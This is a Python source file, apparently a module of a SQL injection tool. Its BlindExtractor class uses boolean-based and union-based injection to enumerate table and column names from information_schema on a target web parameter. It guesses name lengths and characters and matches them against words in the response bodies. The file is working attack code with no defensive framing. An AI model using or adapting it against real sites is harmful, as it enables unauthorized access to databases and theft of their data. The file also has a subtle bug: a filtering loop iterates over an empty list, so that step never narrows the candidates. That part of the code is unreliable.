from core.Requester import Requester
from core.Analyzer import Analyzer
from injections.BooleanInjector import BooleanInjector
from injections.ErrorInjector import ErrorInjector
from injections.UnionInjector import UnionInjector
from injections.TimeInjector import TimeInjector
from utils.Logger import Logger
from utils.constants import HEIGH_ELEMENT_COUNT, HEIGH_NAME_LENGTH, RESET, YELLOW, InjectionContext
from re import findall

class BlindExtractor:
	def __init__(self,
			# requester: Requester, analyzer: Analyzer,
			boolean: BooleanInjector,
   			union: UnionInjector,
		):
		# self.requester = requester
		# self.analyzer = analyzer
		self.boolean = boolean
		self.union = union

	def find_words(
     	self, body: str, start: str, end: str, length: int
    ) -> list[str]:
		"""Find words corresponding to a Regex in a given text"""
		pattern = rf"\b{start}\w{{{length - 2}}}{end}\b"
		return findall(pattern, body)

	def find_db_elem_name(
		self, url: str, param: str, ctx: InjectionContext,
  		column_count: int, expression: str, union_expression: str
    ) -> str:
		"""
		Compute a database element's name
		"""
     
		# Test if we can get the element's name included in the injection's response body
		body_containing_name = self.union.test_expressions_name(
      		url, param, ctx, union_expression, column_count
        )

		# Get the database element's name length
		name_length_expression = f"LENGTH({expression})"
		name_length = self.boolean.get_number_returned_by_sql(
      		url, param, ctx, name_length_expression, HEIGH_NAME_LENGTH
        )

		Logger.success(f"Found database element's name length: {YELLOW}{name_length}{RESET}")

		# Better simply compute for each character if length is short
		if name_length < 5:
			return self.boolean.get_db_elem_name(url, param, ctx, expression, name_length)

		if body_containing_name:
			# Find the first and the last character in the database element's name
			first_last_chars = self.boolean.get_db_elem_name_chars_at_index(
				url, param, ctx, expression, [1, name_length]
			)
			Logger.debug(f"First char: {first_last_chars[0]}, last char: {first_last_chars[1]}")

			# Look for words in the response body that has the right length and first/last char
			words = self.find_words(
       			body_containing_name, first_last_chars[0], first_last_chars[1], name_length
          	)

			if words:
				Logger.debug(
					f"Found words in the body with the right length and starting/ending characters:\n{words}\n"
				)
    
				# If we only have one result we return it
				length = len(words)
				if length == 1:
					return words[0]

				elif length > 1:
					corresponding_names: list[str] = []

					second_and_one_before_last_chars = self.boolean.get_db_elem_name_chars_at_index(
						url, param, ctx, expression, [2, name_length - 1]
					)
					Logger.debug(
						f"Second char: {second_and_one_before_last_chars[0]}, "
						f"one before last char: {second_and_one_before_last_chars[1]}"
					)

					for name in corresponding_names:
						if (name[1] == second_and_one_before_last_chars[0]
							and name[name_length - 2] == second_and_one_before_last_chars[1]):
							corresponding_names.append(name)
	
					# If we only have one result we return it
					if len(corresponding_names) == 1:
						return corresponding_names[0]
					# Compute each character to find out the whole name

		return self.boolean.get_db_elem_name(url, param, ctx, expression, name_length)

	def dump_db_elem_entries(
		self, url: str, param: str, ctx: InjectionContext,
  		column_count: int, nulls: str, db_elem: str,
    ) -> None:
		"""
		Get the number of entries that the database element (table, column) has,
  		then create a loop in which each entry name is found by binary search.
  		"""
  
		# Get the number of database element's entries on the database
		db_elem_count_expression = f"(SELECT COUNT(*) FROM information_schema.{db_elem}s)"
		db_elem_count = self.boolean.get_number_returned_by_sql(
			url, param, ctx, db_elem_count_expression, HEIGH_ELEMENT_COUNT
		)
		Logger.success(f"Found {db_elem} count: {YELLOW}{db_elem_count}{RESET}")

		# Find name for each database element's entry
		for elem in range(db_elem_count):
			expression = f"(SELECT {db_elem}_name FROM information_schema.{db_elem}s LIMIT {elem},1)"
			# Limit is one further as it prints the first SELECT results at index 0
			union_expression = f"""
				SELECT {db_elem}_name,{nulls}
				FROM information_schema.{db_elem}s
				LIMIT {elem + 1},1
			"""

			db_elem_name = self.find_db_elem_name(
				url, param, ctx, column_count,
				expression, union_expression
			)
			if db_elem_name:
				Logger.success(f"Found {db_elem} name: {YELLOW}{db_elem_name}{RESET}\n")